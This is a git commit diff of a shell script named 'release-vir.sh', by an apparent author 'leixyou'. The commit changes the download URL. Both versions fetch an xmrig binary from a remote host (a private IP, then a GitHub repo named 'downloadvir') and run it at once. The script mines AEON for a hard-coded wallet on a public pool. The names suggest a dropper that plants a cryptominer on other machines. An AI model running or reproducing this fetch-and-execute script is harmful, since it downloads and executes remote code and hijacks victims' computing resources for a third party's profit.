9a1069caca9079afd6276ad2365eb34f8a17e3c4
leixyou <leixyou@gmail.com>
2018-02-06 17:50:26 +0800

    Update release-vir.sh

--- release-vir.sh
+++ release-vir.sh
@@ -1,2 +1,2 @@
 #!/bin/sh
-wget -c http://192.168.77.125/xmrig &&./xmrig -o pool.aeon.hashvault.pro:5555 --algo=cryptonight-lite -u Wmryc3xTrZnRnZRg19QLzGQvzjzSqy24wWGGnf8WEFd8K4KNhjvqGMHAPTtMh2MfvxFoLwJshorTxL3ZL15UFFBX1jECtneEx -p x --av=4 --donate-level=1
+wget -c https://github.com/leixyou/downloadvir/blob/master/xmrig &&./xmrig -o pool.aeon.hashvault.pro:5555 --algo=cryptonight-lite -u Wmryc3xTrZnRnZRg19QLzGQvzjzSqy24wWGGnf8WEFd8K4KNhjvqGMHAPTtMh2MfvxFoLwJshorTxL3ZL15UFFBX1jECtneEx -p x --av=4 --donate-level=1
